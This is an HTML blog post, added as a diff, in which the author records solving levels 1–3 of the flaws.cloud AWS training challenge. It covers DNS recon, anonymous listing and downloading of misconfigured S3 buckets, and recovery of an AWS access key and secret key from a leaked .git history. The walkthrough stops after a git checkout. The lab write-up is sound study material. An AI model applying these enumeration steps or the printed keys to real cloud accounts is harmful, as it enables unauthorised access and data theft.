@@ -1,0 +1,979 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Acruxlare | Cloud Security - AWS - Flaws 1</title>
+  <meta name="description" content="My notes of Flaws[flaws.cloud] which is focused on AWS.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Cloud Security - AWS - Flaws 1">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fumenoid.github.io/posts/cloud-security-aws-flaws-1">
+  <meta property="og:description" content="My notes of Flaws[flaws.cloud] which is focused on AWS.">
+  <meta property="og:site_name" content="Acruxlare">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://fumenoid.github.io/posts/cloud-security-aws-flaws-1">
+  <meta name="twitter:title" content="Cloud Security - AWS - Flaws 1">
+  <meta name="twitter:description" content="My notes of Flaws[flaws.cloud] which is focused on AWS.">
+
+  
+    
+      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/flawsthumb-15448171fdc12cba39bb65187b3a83041e7b46e1905d9af3113a08568100ec3f.png">
+      <meta property="og:image:height" content="286">
+      <meta property="og:image:width" content="507">
+      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/flawsthumb-15448171fdc12cba39bb65187b3a83041e7b46e1905d9af3113a08568100ec3f.png">
+      <meta name="twitter:card" content="summary_large_image">
+    
+  
+
+  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:fumenoid@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/cloudsecurity">Cloudsecurity</a></li>
+    
+      
+        <li><a href="/tag/forensics">Forensics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/programming">Programming</a></li>
+    
+      
+        <li><a href="/tag/sorcery">Sorcery</a></li>
+    
+      
+        <li><a href="/tag/tryhackme">Tryhackme</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Cloud Security - AWS - Flaws 1</h1>
+            <p>My notes of Flaws[flaws.cloud] which is focused on AWS.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    October 23, 2021
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      15 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/cloudsecurity" title="See all posts with tag 'cloudsecurity'">cloudsecurity</a>
+    
+      
+      <a href="/tag/sorcery" title="See all posts with tag 'sorcery'">sorcery</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/flaws-9bf1ae4d4be40b34a3b21c3de77e75081e0037d1e2a955436400425a11c31c77.png">
+  <img src="/assets/documentation/flaws-9bf1ae4d4be40b34a3b21c3de77e75081e0037d1e2a955436400425a11c31c77.png" alt="Flaws" class="zooming" data-rjs="/assets/documentation/flaws-9bf1ae4d4be40b34a3b21c3de77e75081e0037d1e2a955436400425a11c31c77.png" data-zooming-width="1311" data-zooming-height="737" />
+</a></p>
+
+<h2 id="flaws">Flaws</h2>
+
+<p>URL - http://flaws.cloud</p>
+
+<h3 id="disclamer">Disclamer</h3>
+
+<p>I am <code class="highlighter-rouge">no expert</code> in cloud security and starting it with Flaws, this blog is mainly <code class="highlighter-rouge">my notes</code> for the solutions of flaws.cloud, The flaws.cloud already have complete solutions in hints so you can simply follow along them if you are looking for solutions, this blog is mainly for me to quickly go through any of these <code class="highlighter-rouge">concepts</code> if I need them later, but if this helps any of you too, feel free to read and <code class="highlighter-rouge">share</code> them :D</p>
+
+<p><em>Below are my notes, they are completely raw without any editing to make them presentable, might also just have screenshots of challenge solutions which i wasn’t able to solve due to resource limitation[I don’t have a AWS account].</em></p>
+
+<h3 id="level-1">Level 1</h3>
+
+<p><a href="/assets/documentation/Pasted image 20211022120406-738cb64e9466c7679fe94c39a713c33a7ef9e7cf912d2b287cca03527b49d4db.png">
+  <img src="/assets/documentation/Pasted image 20211022120406-738cb64e9466c7679fe94c39a713c33a7ef9e7cf912d2b287cca03527b49d4db.png" alt="Level 1" class="zooming" data-rjs="/assets/documentation/Pasted image 20211022120406-738cb64e9466c7679fe94c39a713c33a7ef9e7cf912d2b287cca03527b49d4db.png" data-zooming-width="862" data-zooming-height="148" />
+</a></p>
+
+<p>Alright so, <code class="highlighter-rouge">S3</code> buckets can be used to host a static site and the cool thing is, the name of the bucket should be same as the domain name of the website.</p>
+
+<p>And <code class="highlighter-rouge">S3</code> buckets names are unique so in case i have a s3 bucket named <code class="highlighter-rouge">amazon.com</code>, amazon can’t create same bucket/host his website using the s3 bucket.</p>
+
+<p>Finding out the s3 info from a site,</p>
+
+<p>1st - <code class="highlighter-rouge">Dig it up</code> to find the actual IP address</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>dig flaws.cloud
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> flaws.cloud
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 30624
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
+;; QUESTION SECTION:
+;flaws.cloud.                   IN      A
+
+;; ANSWER SECTION:
+flaws.cloud.            5       IN      A       52.218.169.58
+
+;; Query time: 27 msec
+;; SERVER: 192.168.119.2#53(192.168.119.2)
+;; WHEN: Fri Oct 22 12:09:43 EDT 2021
+;; MSG SIZE  rcvd: 56</span></code></pre></figure>
+
+<p>2nd - Use <code class="highlighter-rouge">nslookup</code> to find the domain name</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">  
+┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nslookup 52.218.169.58                   
+58.169.218.52.in-addr.arpa      name <span class="o">=</span> s3-website-us-west-2.amazonaws.com.
+
+Authoritative answers can be found from:</code></pre></figure>
+
+<p>We can conclude from this that the <code class="highlighter-rouge">S3 bucket</code> is used to host the website and it is hosted from a server in <code class="highlighter-rouge">us-west-2</code>.</p>
+
+<p>As the name of bucket should be same as the domain, so bucket name is flaws.cloud and we can reach the same website using the url - <code class="highlighter-rouge">https://flaws.cloud.s3-website-us-west-3.amazonaws.com</code></p>
+
+<p><a href="/assets/documentation/Pasted image 20211022121946-6a5d2081b785896ba78bec4e7d7cd64bdba9281847196a4c08d1f4f16305e28b.png">
+  <img src="/assets/documentation/Pasted image 20211022121946-6a5d2081b785896ba78bec4e7d7cd64bdba9281847196a4c08d1f4f16305e28b.png" alt="Level 1" class="zooming" data-rjs="/assets/documentation/Pasted image 20211022121946-6a5d2081b785896ba78bec4e7d7cd64bdba9281847196a4c08d1f4f16305e28b.png" data-zooming-width="1920" data-zooming-height="887" />
+</a></p>
+
+<p>Alright now let’s check if the bucket is configured insecurily.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>apt <span class="nb">install </span>awscli</code></pre></figure>
+
+<p><code class="highlighter-rouge">CLI</code> to read files</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://flaws.cloud <span class="nt">--recursive</span> <span class="nt">--no-sign-request</span>
+2017-03-13 23:00:38       2575 hint1.html
+2017-03-02 23:05:17       1707 hint2.html
+2017-03-02 23:05:11       1101 hint3.html
+2020-05-22 14:16:45       3162 index.html
+2018-07-10 12:47:16      15979 logo.png
+2017-02-26 20:59:28         46 robots.txt
+2017-02-26 20:59:30       1051 secret-dd02c7c.html</code></pre></figure>
+
+<p>Alternatively, we can also navigate to <code class="highlighter-rouge">https://flaws.cloud.s3.amazonaws.com</code>.</p>
+
+<p><a href="/assets/documentation/Pasted image 20211022141723-b0b1261796113543bee23910a9da4d23193a49665eb0b5b10e35183bf3f7fa96.png">
+  <img src="/assets/documentation/Pasted image 20211022141723-b0b1261796113543bee23910a9da4d23193a49665eb0b5b10e35183bf3f7fa96.png" alt="Level 1" class="zooming" data-rjs="/assets/documentation/Pasted image 20211022141723-b0b1261796113543bee23910a9da4d23193a49665eb0b5b10e35183bf3f7fa96.png" data-zooming-width="1920" data-zooming-height="977" />
+</a></p>
+
+<p>Readin files, both web and cli</p>
+
+<p><code class="highlighter-rouge">Web</code> - bucketname.s3.amazonaws.com/key</p>
+
+<p><a href="/assets/documentation/Pasted image 20211022141837-7dfb3534aee9ba89d31e18f92e967def688d3f71a6b9e1b99848e8a51bc746ee.png">
+  <img src="/assets/documentation/Pasted image 20211022141837-7dfb3534aee9ba89d31e18f92e967def688d3f71a6b9e1b99848e8a51bc746ee.png" alt="Level 1" class="zooming" data-rjs="/assets/documentation/Pasted image 20211022141837-7dfb3534aee9ba89d31e18f92e967def688d3f71a6b9e1b99848e8a51bc746ee.png" data-zooming-width="1920" data-zooming-height="675" />
+</a></p>
+
+<p><code class="highlighter-rouge">CLI</code> - cp the file to stdout and use –no-sign-request as we don’t have keys to sign in anyway.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://flaws.cloud/secret-dd02c7c.html - <span class="nt">--no-sign-request</span>                                                                                                                  255 ⨯
+&lt;html&gt;
+    &lt;<span class="nb">head</span><span class="o">&gt;</span>
+        &lt;title&gt;flAWS&lt;/title&gt;
+        &lt;META <span class="nv">NAME</span><span class="o">=</span><span class="s2">"ROBOTS"</span> <span class="nv">CONTENT</span><span class="o">=</span><span class="s2">"NOINDEX, NOFOLLOW"</span><span class="o">&gt;</span>
+        &lt;style&gt;
+            body <span class="o">{</span> font-family: Andale Mono, monospace<span class="p">;</span> <span class="o">}</span>
+            :not<span class="o">(</span>center<span class="o">)</span> <span class="o">&gt;</span> pre <span class="o">{</span> background-color: <span class="c">#202020; padding: 4px; border-radius: 5px; border-color:#00d000; </span>
+            border-width: 1px<span class="p">;</span> border-style: solid<span class="p">;</span><span class="o">}</span> 
+        &lt;/style&gt;
+    &lt;/head&gt;
+&lt;body 
+  <span class="nv">text</span><span class="o">=</span><span class="s2">"#00d000"</span> 
+  <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">"#000000"</span>  
+  <span class="nv">style</span><span class="o">=</span><span class="s2">"max-width:800px; margin-left:auto ;margin-right:auto"</span>
+  <span class="nv">vlink</span><span class="o">=</span><span class="s2">"#00ff00"</span> <span class="nb">link</span><span class="o">=</span><span class="s2">"#00ff00"</span><span class="o">&gt;</span>
+    
+&lt;center&gt;
+&lt;pre <span class="o">&gt;</span>
+ _____  _       ____  __    __  _____
+|     <span class="o">||</span> |     /    <span class="o">||</span>  |__|  |/ ___/
+|   __|| |    |  o  <span class="o">||</span>  |  |  <span class="o">(</span>   <span class="se">\_</span> 
+|  |_  | |___ |     <span class="o">||</span>  |  |  |<span class="se">\_</span>_  |
+|   _] |     <span class="o">||</span>  _  <span class="o">||</span>  <span class="sb">`</span>  <span class="s1">'  |/  \ |
+|  |   |     ||  |  | \      / \    |
+|__|   |_____||__|__|  \_/\_/   \___|
+&lt;/pre&gt;
+
+&lt;h1&gt;Congrats! You found the secret file!&lt;/h1&gt;
+&lt;/center&gt;
+
+
+Level 2 is at &lt;a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud"&gt;http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud&lt;/a&gt;                                   </span></code></pre></figure>
+
+<h4 id="level-1---summarized">Level 1 - Summarized</h4>
+<p>By default <code class="highlighter-rouge">S3 buckets</code> are secure and this problem doesn’t arise unless a user mess up the <code class="highlighter-rouge">perms</code>.</p>
+
+<p><a href="/assets/documentation/Pasted image 20211023031833-f56bb69de19438cf62edeef481d3f9f44f21ea3f610248e54a5b4b31f24ebf48.png">
+  <img src="/assets/documentation/Pasted image 20211023031833-f56bb69de19438cf62edeef481d3f9f44f21ea3f610248e54a5b4b31f24ebf48.png" alt="Level 1" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023031833-f56bb69de19438cf62edeef481d3f9f44f21ea3f610248e54a5b4b31f24ebf48.png" data-zooming-width="916" data-zooming-height="721" />
+</a></p>
+
+<h3 id="level-2">Level 2</h3>
+
+<p><a href="/assets/documentation/Pasted image 20211023032029-b2952d6cbeeda3fd141ce2a1a7619f62cef99a732cfc73aec52128c5285b4462.png">
+  <img src="/assets/documentation/Pasted image 20211023032029-b2952d6cbeeda3fd141ce2a1a7619f62cef99a732cfc73aec52128c5285b4462.png" alt="Level 2" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023032029-b2952d6cbeeda3fd141ce2a1a7619f62cef99a732cfc73aec52128c5285b4462.png" data-zooming-width="860" data-zooming-height="170" />
+</a></p>
+
+<p>1- Let’s <code class="highlighter-rouge">Dig it up</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>dig level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 29628
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
+;; QUESTION SECTION:
+;level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud. IN        A
+
+;; ANSWER SECTION:
+level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud. 5 IN A 52.218.182.130
+
+;; Query time: 52 msec
+;; SERVER: 192.168.119.2#53(192.168.119.2)
+;; WHEN: Sat Oct 23 03:21:51 EDT 2021
+;; MSG SIZE  rcvd: 96</span></code></pre></figure>
+
+<p>2- <code class="highlighter-rouge">Nslookup</code> to find if it’s a AWS s3 bucket</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nslookup 52.218.182.130
+130.182.218.52.in-addr.arpa     name <span class="o">=</span> s3-website-us-west-2.amazonaws.com.
+
+Authoritative answers can be found from:</code></pre></figure>
+
+<p>As it’s a static site hosted on s3 bucket, the bucket name should be equal to the domain/subdomain name, hence we can go to <code class="highlighter-rouge">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/</code> to access the bucket but</p>
+
+<p><a href="/assets/documentation/Pasted image 20211023032557-4d69f4b4f04a1979680c4b25f71eb2f0b8e89882b7d23171bd49573c905d0551.png">
+  <img src="/assets/documentation/Pasted image 20211023032557-4d69f4b4f04a1979680c4b25f71eb2f0b8e89882b7d23171bd49573c905d0551.png" alt="Level 2" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023032557-4d69f4b4f04a1979680c4b25f71eb2f0b8e89882b7d23171bd49573c905d0551.png" data-zooming-width="1920" data-zooming-height="405" />
+</a></p>
+
+<p>Seems like it is secured this time, lets try <code class="highlighter-rouge">CLI</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud <span class="nt">--no-sign-request</span>
+
+An error occurred <span class="o">(</span>AccessDenied<span class="o">)</span> when calling the ListObjectsV2 operation: Access Denied</code></pre></figure>
+
+<p>Hint 1, we said we need our own AWS account for this.. hmm, guess we might really need one : /</p>
+
+<p>welp fuck..</p>
+
+<p>Configuring AWS profile</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws configure                                                                  
+AWS Access Key ID <span class="o">[</span>None]: <span class="o">[</span>Redacted]
+AWS Secret Access Key <span class="o">[</span>None]: <span class="o">[</span>Redacted]
+Default region name <span class="o">[</span>None]: 
+Default output format <span class="o">[</span>None]: </code></pre></figure>
+
+<p>Now attempting to read the content of <code class="highlighter-rouge">s3 bucket</code> with our keys, not really sure how it works but will read the summary properly</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud <span class="nt">--profile</span> default
+2017-02-26 21:02:15      80751 everyone.png
+2017-03-02 22:47:17       1433 hint1.html
+2017-02-26 21:04:39       1035 hint2.html
+2017-02-26 21:02:14       2786 index.html
+2017-02-26 21:02:14         26 robots.txt
+2017-02-26 21:02:15       1051 secret-e4443fc.html</code></pre></figure>
+
+<p>Reading the secret file - <code class="highlighter-rouge">CLI</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html - <span class="nt">--profile</span> default
+&lt;html&gt;
+    &lt;<span class="nb">head</span><span class="o">&gt;</span>
+        &lt;title&gt;flAWS&lt;/title&gt;
+        &lt;META <span class="nv">NAME</span><span class="o">=</span><span class="s2">"ROBOTS"</span> <span class="nv">CONTENT</span><span class="o">=</span><span class="s2">"NOINDEX, NOFOLLOW"</span><span class="o">&gt;</span>
+        &lt;style&gt;
+            body <span class="o">{</span> font-family: Andale Mono, monospace<span class="p">;</span> <span class="o">}</span>
+            :not<span class="o">(</span>center<span class="o">)</span> <span class="o">&gt;</span> pre <span class="o">{</span> background-color: <span class="c">#202020; padding: 4px; border-radius: 5px; border-color:#00d000; </span>
+            border-width: 1px<span class="p">;</span> border-style: solid<span class="p">;</span><span class="o">}</span> 
+        &lt;/style&gt;
+    &lt;/head&gt;
+&lt;body 
+  <span class="nv">text</span><span class="o">=</span><span class="s2">"#00d000"</span> 
+  <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">"#000000"</span>  
+  <span class="nv">style</span><span class="o">=</span><span class="s2">"max-width:800px; margin-left:auto ;margin-right:auto"</span>
+  <span class="nv">vlink</span><span class="o">=</span><span class="s2">"#00ff00"</span> <span class="nb">link</span><span class="o">=</span><span class="s2">"#00ff00"</span><span class="o">&gt;</span>
+    
+&lt;center&gt;
+&lt;pre <span class="o">&gt;</span>
+ _____  _       ____  __    __  _____
+|     <span class="o">||</span> |     /    <span class="o">||</span>  |__|  |/ ___/
+|   __|| |    |  o  <span class="o">||</span>  |  |  <span class="o">(</span>   <span class="se">\_</span> 
+|  |_  | |___ |     <span class="o">||</span>  |  |  |<span class="se">\_</span>_  |
+|   _] |     <span class="o">||</span>  _  <span class="o">||</span>  <span class="sb">`</span>  <span class="s1">'  |/  \ |
+|  |   |     ||  |  | \      / \    |
+|__|   |_____||__|__|  \_/\_/   \___|
+&lt;/pre&gt;
+
+&lt;h1&gt;Congrats! You found the secret file!&lt;/h1&gt;
+&lt;/center&gt;
+
+
+Level 3 is at &lt;a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud"&gt;http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud&lt;/a&gt;                                   </span></code></pre></figure>
+
+<p>Web, by navigating to that webpage</p>
+
+<p><a href="/assets/documentation/Pasted image 20211023044409-63a675d31ece96a12cf9e4c5c0f002a7fb4c59b96af8c9a50f2c88f8fbaf3e32.png">
+  <img src="/assets/documentation/Pasted image 20211023044409-63a675d31ece96a12cf9e4c5c0f002a7fb4c59b96af8c9a50f2c88f8fbaf3e32.png" alt="Level 2" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023044409-63a675d31ece96a12cf9e4c5c0f002a7fb4c59b96af8c9a50f2c88f8fbaf3e32.png" data-zooming-width="1920" data-zooming-height="411" />
+</a></p>
+
+<h4 id="level-2---summarized">Level 2 - Summarized</h4>
+
+<p>There was a setting to allow any AWS user to access a bucket, this setting can’t be added via IAM now but <code class="highlighter-rouge">SDKs</code> and <code class="highlighter-rouge">third parties tools</code> may allow it, hence worth checking.</p>
+
+<p><a href="/assets/documentation/Pasted image 20211023044543-84977935f160db67afa6fe8618931d98ec64bbcbe8a2dae49b86f4b47e9ac795.png">
+  <img src="/assets/documentation/Pasted image 20211023044543-84977935f160db67afa6fe8618931d98ec64bbcbe8a2dae49b86f4b47e9ac795.png" alt="Level 2" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023044543-84977935f160db67afa6fe8618931d98ec64bbcbe8a2dae49b86f4b47e9ac795.png" data-zooming-width="1920" data-zooming-height="820" />
+</a></p>
+
+<h3 id="level-3">Level 3</h3>
+
+<p><a href="/assets/documentation/Pasted image 20211023044823-3485300b4946d2efd01ddb5f04dacbcdf4dc2bf6ec021a86321c8b1c89a6856a.png">
+  <img src="/assets/documentation/Pasted image 20211023044823-3485300b4946d2efd01ddb5f04dacbcdf4dc2bf6ec021a86321c8b1c89a6856a.png" alt="Level 3" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023044823-3485300b4946d2efd01ddb5f04dacbcdf4dc2bf6ec021a86321c8b1c89a6856a.png" data-zooming-width="848" data-zooming-height="167" />
+</a></p>
+
+<p>Again using <code class="highlighter-rouge">dig</code> and <code class="highlighter-rouge">nslookup</code> to confirm this website is hosted on s3 bucket.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>dig level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 4993
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
+;; QUESTION SECTION:
+;level3-9afd3927f195e10225021a578e6f78df.flaws.cloud. IN        A
+
+;; ANSWER SECTION:
+level3-9afd3927f195e10225021a578e6f78df.flaws.cloud. 5 IN A 52.218.153.50
+
+;; Query time: 20 msec
+;; SERVER: 192.168.119.2#53(192.168.119.2)
+;; WHEN: Sat Oct 23 04:51:29 EDT 2021
+;; MSG SIZE  rcvd: 96
+         
+┌──(fumenoid㉿kali)-[~]
+└─</span><span class="nv">$ </span><span class="sh">nslookup 52.218.153.50 
+50.153.218.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.
+
+Authoritative answers can be found from:</span></code></pre></figure>
+
+<p>Woaw I can read the bucket</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud <span class="nt">--no-sign-request</span>
+                           PRE .git/
+2017-02-26 19:14:33     123637 authenticated_users.png
+2017-02-26 19:14:34       1552 hint1.html
+2017-02-26 19:14:34       1426 hint2.html
+2017-02-26 19:14:35       1247 hint3.html
+2017-02-26 19:14:33       1035 hint4.html
+2020-05-22 14:21:10       1861 index.html
+2017-02-26 19:14:33         26 robots.txt</code></pre></figure>
+
+<p>also there is a <code class="highlighter-rouge">.GIT</code> hmmm, let’s download the whole bucket</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/FLaws3]
+└─<span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ <span class="nb">.</span> <span class="nt">--no-sign-request</span> <span class="nt">--recursive</span>
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to .git/hooks/post-update.sample
+<span class="o">[</span>Redacted]
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png</code></pre></figure>
+
+<p><code class="highlighter-rouge">git log</code> and <code class="highlighter-rouge">git show</code> to find the access keys.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/FLaws3]
+└─<span class="nv">$ </span>git show f52ec03b227ea6094b04e43f475fb0126edb5a61
+commit f52ec03b227ea6094b04e43f475fb0126edb5a61
+Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
+Date:   Sun Sep 17 09:10:07 2017 <span class="nt">-0600</span>
+
+    first commit
+
+diff <span class="nt">--git</span> a/access_keys.txt b/access_keys.txt
+new file mode 100644
+index 0000000..e3ae6dd
+<span class="nt">---</span> /dev/null
++++ b/access_keys.txt
+@@ <span class="nt">-0</span>,0 +1,2 @@
++access_key AKIAJ366LIPB4IJKT7SA
++secret_access_key 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</code></pre></figure>
+
+<p>also we got the older file, Switching back to the older commit</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud/FLaws3]
+└─<span class="nv">$ </span>git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+M       index.html
+Note: switching to <span class="s1">'f52ec03b227ea6094b04e43f475fb0126edb5a61'</span><span class="nb">.</span>
